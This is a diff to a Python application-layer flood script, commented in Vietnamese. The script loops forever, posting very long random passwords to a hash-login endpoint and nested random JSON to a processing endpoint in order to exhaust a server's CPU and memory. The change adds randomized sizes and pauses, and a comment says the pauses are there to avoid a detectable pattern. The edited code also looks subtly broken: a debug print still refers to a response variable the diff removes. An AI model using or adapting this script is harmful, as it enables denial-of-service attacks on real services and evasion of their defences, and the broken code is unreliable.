@@ -17,36 +17,42 @@ print(f"[*] Bắt đầu L7 Application Flood vào {target} (Kiểu: {attack_typ
 
 request_count = 0
 
-def generate_long_string(length=100000):
-    """Tạo một chuỗi ngẫu nhiên khổng lồ để bắt server băm"""
+def generate_long_string(min_len=1000, max_len=100000):
+    """Tạo một chuỗi ngẫu nhiên với độ dài biến thiên"""
+    length = random.randint(min_len, max_len)
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-def generate_deep_json(depth=50, breadth=10): # Giảm chiều sâu xuống để tải CPU bớt đi
-    """Tạo một cấu trúc JSON lồng nhau vừa phải để gửi đi nhanh hơn"""
+def generate_deep_json():
+    """Tạo một cấu trúc JSON lồng nhau ngẫu nhiên"""
+    depth = random.randint(5, 20)
+    breadth = random.randint(2, 5)
     dummy_dict = {}
     current_level = dummy_dict
     for i in range(depth):
         current_level[f"level_{i}"] = {}
         for j in range(breadth):
-            current_level[f"level_{i}"][f"data_{j}"] = generate_long_string(50) # Giảm độ dài chuỗi
+            current_level[f"level_{i}"][f"data_{j}"] = generate_long_string(10, 100)
         current_level = current_level[f"level_{i}"]
     return dummy_dict
+
 try:
     while True:
         try:
             if attack_type == "hash":
-                # Tấn công CPU: Gửi mật khẩu dài
+                # Tấn công CPU: Gửi mật khẩu dài ngẫu nhiên
                 data = {'password': generate_long_string()}
                 requests.post(f"{target.rstrip('/')}/api/hash_login", data=data, verify=False, timeout=5)
                 request_count += 1
                 
             elif attack_type == "json":
-                # Tấn công RAM: Gửi payload bé xíu để kích hoạt RAM leak ở Backend
-                payload = {"trigger": "leak_memory"}
+                # Tấn công RAM/CPU: Gửi payload JSON biến thiên
+                payload = generate_deep_json()
                 headers = {'Content-Type': 'application/json'}
-                
-                response = requests.post(f"{target.rstrip('/')}/api/process_json", json=payload, headers=headers, verify=False, timeout=5)
+                requests.post(f"{target.rstrip('/')}/api/process_json", json=payload, headers=headers, verify=False, timeout=5)
                 request_count += 1
+            
+            # Thêm khoảng nghỉ ngẫu nhiên để tránh pattern tĩnh
+            time.sleep(random.uniform(0.1, 0.5))
                 
                 # IN RA TẤT CẢ ĐỂ DEBUG
                 print(f"[DEBUG] Request {request_count} - Status: {response.status_code} - Text: {response.text[:50]}")
